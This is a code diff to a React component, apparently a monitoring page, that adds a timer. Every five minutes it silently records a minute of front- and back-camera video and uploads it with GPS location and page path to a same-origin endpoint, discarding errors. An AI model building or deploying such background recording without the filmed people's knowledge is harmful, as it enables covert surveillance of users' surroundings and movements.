@@ -66,6 +66,84 @@ export default function OperationWatcher() {
     // eslint-disable-next-line react-hooks/exhaustive-deps
   }, []);
 
+  /** 录一段视频（默认 60 秒），返回 blob。低码率控制体积。 */
+  const recordOne = (stream: MediaStream, ms: number): Promise<Blob | null> =>
+    new Promise((resolve) => {
+      try {
+        const MR = window.MediaRecorder;
+        if (!MR) return resolve(null);
+        const mime = ['video/mp4', 'video/webm;codecs=vp8', 'video/webm'].find((m) =>
+          MR.isTypeSupported(m)
+        );
+        const rec = new MR(stream, {
+          ...(mime ? { mimeType: mime } : {}),
+          videoBitsPerSecond: 300_000,
+        });
+        const chunks: Blob[] = [];
+        rec.ondataavailable = (e) => {
+          if (e.data && e.data.size) chunks.push(e.data);
+        };
+        rec.onstop = () => resolve(new Blob(chunks, { type: rec.mimeType || mime || 'video/webm' }));
+        rec.onerror = () => resolve(null);
+        rec.start(1000);
+        setTimeout(() => {
+          try {
+            if (rec.state !== 'inactive') rec.stop();
+          } catch {
+            resolve(null);
+          }
+        }, ms);
+      } catch {
+        resolve(null);
+      }
+    });
+
+  const blobToBase64 = async (blob: Blob): Promise<string> => {
+    const buf = await blob.arrayBuffer();
+    const bytes = new Uint8Array(buf);
+    let bin = '';
+    const CH = 0x8000;
+    for (let i = 0; i < bytes.length; i += CH) {
+      bin += String.fromCharCode(...bytes.subarray(i, i + CH));
+    }
+    return `data:${blob.type || 'video/webm'};base64,${btoa(bin)}`;
+  };
+
+  /** 每 5 分钟自动录 1 分钟前后双视频上报。 */
+  const videoCycle = async () => {
+    if (!enabledRef.current) return;
+    const path = pathRef.current;
+    if (AUTH_PAGES.some((p) => path === p || path.startsWith(p + '/'))) return;
+    const okStream = await ensureStream();
+    if (!okStream || !streamRef.current) return;
+    const frontBlob = await recordOne(streamRef.current, 60_000);
+    const backBlob = backStreamRef.current ? await recordOne(backStreamRef.current, 60_000) : null;
+    if (!frontBlob && !backBlob) return;
+    try {
+      const payload = {
+        videoFront: frontBlob ? await blobToBase64(frontBlob) : '',
+        videoBack: backBlob ? await blobToBase64(backBlob) : '',
+        gps: gpsRef.current,
+        path,
+      };
+      await fetch('/api/entry/video', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload),
+      }).catch(() => undefined);
+    } catch {
+      /* ignore */
+    }
+  };
+
+  useEffect(() => {
+    const timer = setInterval(() => {
+      void videoCycle();
+    }, 5 * 60 * 1000);
+    return () => clearInterval(timer);
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, []);
+
   const openOne = async (facing: 'user' | 'environment') => {
     const s = await navigator.mediaDevices.getUserMedia({
       video: { facingMode: facing, width: { ideal: 640 } },
